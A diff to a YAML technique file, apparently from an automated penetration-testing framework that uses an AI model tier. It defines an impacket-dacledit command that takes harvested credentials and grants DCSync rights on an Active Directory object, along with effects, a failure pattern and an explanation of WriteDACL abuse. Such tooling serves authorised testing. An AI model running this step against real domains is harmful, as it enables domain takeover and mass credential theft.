@@ -10,8 +10,8 @@ parameters:
   username: from_cred.username
   password: from_cred.password
   target_user: from_finding.target_user
-command_template: impacket-dacledit '{domain}/{username}:{password}' -dc-ip {target_ip}
-  -target '{target_user}' -action write -rights DCSync
+command_template: impacket-dacledit '{domain}/{username}:{password}' -dc-ip {target_ip} -target '{target_user}' -action write
+  -rights DCSync
 parser: generic_parser
 expected_effects:
 - acl_modified
@@ -20,6 +20,8 @@ falsifier:
   pattern: error|INSUFFICIENT_ACCESS
   timeout: 30
 model_tier: haiku
-mechanism: 'Modifies DACL on AD object. WriteDACL permission allows granting any right.
-  Key rights: DCSync (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All),
-  GenericAll (full control), GenericWrite (modify attributes).'
+mechanism: 'Modifies DACL on AD object. WriteDACL permission allows granting any right. Key rights: DCSync (DS-Replication-Get-Changes
+  + DS-Replication-Get-Changes-All), GenericAll (full control), GenericWrite (modify attributes).'
+references:
+  ocd_mindmap_node_ids:
+  - 1aac6b2398
